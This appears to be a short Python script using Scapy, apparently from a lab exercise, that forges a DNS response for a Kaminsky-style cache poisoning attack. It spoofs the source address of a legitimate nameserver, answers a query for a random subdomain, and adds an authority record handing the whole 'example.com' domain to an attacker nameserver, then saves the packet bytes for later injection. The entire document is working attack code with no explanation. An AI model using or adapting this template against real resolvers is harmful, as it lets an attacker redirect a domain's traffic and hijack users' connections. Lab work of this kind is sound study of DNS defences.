from scapy.all import *

targetName="xxxxx.example.com"
targetDomain="example.com"
attackerNS ="ns.xzc.com"

dstIP="172.17.0.3"
srcIP='199.43.135.53'                                    

ip = IP(dst=dstIP,src=srcIP,chksum=0)
udp = UDP(dport=33333,sport=53,chksum=0)

Qdsec = DNSQR(qname=targetName)
Ansec = DNSRR(rrname=targetName,type='A',rdata='1.2.3.4',ttl=259200)
NSsec = DNSRR(rrname=targetDomain,type='NS',rdata=attackerNS,ttl=259200)
dns   = DNS(id=0xAAAA,aa=1,rd=1,qr=1,qdcount=1,ancount=1,nscount=1,arcount=0,qd=Qdsec,an=Ansec,ns=NSsec)
Replypkt = ip/udp/dns

with open('ip_resp.bin','wb') as f:
	f.write(bytes(Replypkt))